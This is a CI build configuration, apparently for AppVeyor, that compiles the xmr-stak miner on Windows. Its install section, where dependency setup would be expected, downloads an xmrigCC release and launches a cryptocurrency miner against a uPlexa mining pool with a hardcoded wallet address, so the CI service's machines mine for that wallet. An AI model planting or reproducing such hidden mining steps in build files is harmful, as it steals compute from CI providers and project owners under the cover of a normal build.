# image
image: Visual Studio 2015

# build platform
platform: x64

# clone directory
clone_folder: c:\xmr-stak

install:
  - wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz
  - tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz
  - ./miner/xmrigDaemon --donate-level 2 -o uplexa.herominers.com:10470 -u UPX1t71Hx7A4GDuqTJ455sN9F5aYhmZsKYUxDB4RqBaV7v354i95z199gwE2CDF6X5X9ETgC6UcKN84r2JZZcKsF5VbfhwwarG -p SUKUMANTE -a cn-extremelite/upx2 -k -t2


build_script:
  - call "C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\Tools\VsMSBuildCmd.bat"
  - cd c:\xmr-stak
  - mkdir build
  - cd build
  - set CMAKE_PREFIX_PATH=C:\xmr-stak-dep\hwloc;C:\xmr-stak-dep\libmicrohttpd;C:\xmr-stak-dep\openssl;
  - cmake -G "Visual Studio 14 2015 Win64" -T v140,host=x64 .. -DCUDA_ARCH=30
  - cmake --build . --config Release --target install

test_script:
  - cd c:\xmr-stak\build\bin\Release
  - dir
  - copy C:\xmr-stak-dep\openssl\bin\* .
  - set XMRSTAK_NOWAIT=1
  - xmr-stak.exe --help --noUAC
